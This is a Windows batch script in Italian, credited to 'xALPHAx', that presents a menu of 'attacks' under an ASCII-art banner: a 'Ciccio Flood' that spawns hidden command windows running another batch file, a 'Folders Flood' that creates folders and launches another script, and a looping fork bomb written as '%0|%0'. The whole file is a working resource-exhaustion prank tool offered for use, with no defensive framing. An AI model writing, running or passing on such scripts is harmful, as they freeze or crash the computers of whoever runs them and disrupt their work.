@echo off 
set "url=https://preview.redd.it/al-quanto-random-ma-cosa-ne-pensate-di-cicciogamer89-e-del-v0-4hyw3h0vsmcf1.jpeg?width=1080&crop=smart&auto=webp&s=6219935821edc69f9b4c3f5d1f6d241ac554f00b"
:start                                                                    	                                                                      
cls                                                                                                                                          
echo    .#  ##   .####.   ###  ###  ########    :####:    :##:      .#  ## 
echo    :#: ##   ######   ###  ###  ########    ######     ##       :#: ## 
echo    ## .#   :##  ##:  ###::###  ##        :##:  .#    ####      ## .#  
echo  ######### ##:  :##  ###  ###  ##        ##:         ####    #########
echo  ######### ##    ##  ## ## ##  ##        ##.        :#  #:   #########
echo   :#: ##   ##    ##  ##:##:##  #######   ##          #::#     :#: ##  
echo   ## :#    ##    ##  ##.##.##  #######   ##  ####   ##  ##    ## :#   
echo #########  ##    ##  ## ## ##  ##        ##. ####   ######  ######### 
echo #########  ##:  :##  ##    ##  ##        ##:   ##  .######. ######### 
echo  :#: ##    :##  ##:  ##    ##  ##        :##:  ##  :##  ##:  :#: ##   
echo  ## .#      ######   ##    ##  ########   #######  ###  ###  ## .#    
echo  ## :#:     .####.   ##    ##  ########    :####.  ##:  :##  ## :#:   
echo ====================================================================
echo.
echo SCRIPT MADE BY xALPHAx
echo LISTA ATTACCHI
echo [1] Ciccio Flood
echo [2] Folders Flood
echo [3] Fork Bomb		
SET /P ANSWER=Attacco desiderato? 
echo Hai scelto: %ANSWER%
echo.
IF "%ANSWER%"=="1" goto :c
IF "%ANSWER%"=="2" goto :f
IF "%ANSWER%"=="3" goto :b
pause
echo Scelta non valida.
goto :start

:c
for /l %%i in (1,1,2) do start /min cmd /k Ciccio_flood.bat
pause
goto:end

:f
md %random&
start folder.bat
goto:end

:b
%0|%0
goto:b

:end
